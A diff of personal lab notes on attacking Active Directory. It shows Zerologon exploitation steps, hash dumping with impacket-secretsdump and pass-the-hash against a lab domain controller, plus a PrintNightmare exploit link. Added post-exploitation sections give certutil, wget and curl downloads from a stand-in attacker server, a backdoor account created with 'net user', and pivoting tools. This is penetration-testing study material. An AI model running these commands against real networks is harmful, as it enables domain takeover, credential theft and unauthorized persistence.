@@ -474,36 +474,101 @@ As this attack is extremely dangerous, I need to consider the potential impact o
 1. `git clone https://github.com/dirkjanm/CVE-2020-1472.git`
    `git clone https://github.com/SecuraBV/CVE-2020-1472.git`
 
-It will be great to save the folder in `/opt`.
+   It will be great to save the folder in `/opt`.
 
 2. Run `python3 zerologon_tester.py HYDRA-DC 192.168.64.32`
 
-If DC can be compromised by a zerologon attack through this checking.
+   If DC can be compromised by a zerologon attack through this checking.
 
-Then exploit.
+   Then exploit.
 
 3. `python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.64.32`
 
 4. `impacket-secretsdump -just-dc MARVEL/HYDRA-DC\$@192.168.64.32`
 
-Hashes will be dumped.
+   Hashes will be dumped.
 
-Restore this server!
+   Restore this server!
 
 5. `impacket-secretsdump administrator@192.168.64.32 -hashes $(dumped hashes)`
 
-The hash formate will be like `a:a`.
+   The hash formate will be like `a:a`.
 
-And then copy the `$(plain_password_hex)`
+   And then copy the `$(plain_password_hex)`
 
 6. `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.64.32 -hexpass $(plain_password_hex)`
 
-This command is to restore the password.
+   This command is to restore the password.
 
-- PrintNightmare
+   - PrintNightmare
 
-This vulnerability does not require authentication to exploit. It takes advantage of the print spooler service. It allows users to add printers and perform other actions, running with system privileges.
+   This vulnerability does not require authentication to exploit. It takes advantage of the print spooler service. It allows users to add printers and perform other actions, running with system privileges.
 
-https://github.com/cube0x0/CVE-2021-1675
+   https://github.com/cube0x0/CVE-2021-1675
 
 ## Attacking Active Directory: Post Exploitation
+
+1. File Transfer
+
+   For windows:
+
+   To download a file from a server, use the following command:
+
+   `certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt`
+
+   Here, `http://10.10.10.10` is the address of the server from which the file needs to be downloaded.
+
+   For linux:
+
+   To start a simple HTTP server using Python on port 80, use:
+
+   `python -m http.server 80`
+
+   This command allows for easy file transfer over HTTP.
+
+   To download files, use either:
+
+   `wget http://10.10.10.10/file.txt`
+   `curl http://10.10.10.10/file.txt`
+
+   To start an FTP server using Python's `pyftpdlib` module on port 21, use:
+
+   `python -m pyftpdlib 21`
+
+   This server can be used to transfer files to and from an attacker machine or any other system.
+
+   To connect to the FTP server running on 10.10.10.10, use:
+
+   `ftp 10.10.10.10`
+
+   IT uses the FTP client to connect to ftp server running on `10.10.10.10`
+
+   For Browser,
+
+   I can navigate directly to file. Like `http://10.10.10.10/file.txt` can be used.
+
+2. Maintaining access
+
+   To maintain persistent access even if the user's computer is shut down, it is likely to lose the shell. One of great way to make persistent access is to add a user. Although adding a new user can be noticeable, it is a safe way to maintain access.
+
+   For example,
+
+   `net user hacker password123 /add`
+
+   Using persistence scripts with Metasploit can be dangerous because it essentially leaves an open port for you to connect to, which might be easily detected.
+
+3. Pivoting
+
+   In post-exploitation, pivoting is a technique used to extend access from a compromised machine (the initial foothold) to other machines or networks that are not directly accessible from the attacker's original entry point.
+
+   `proxychain`, `sshuttle`, and `chisel` can be used.
+
+4. Cleaning up
+
+    I have to make the system/network as it was when I entered it.
+
+    - Remove executables, scripts, and added files
+
+    - Remove malware, rootkits, and added user accounts
+
+    - Set settings back to original configurations
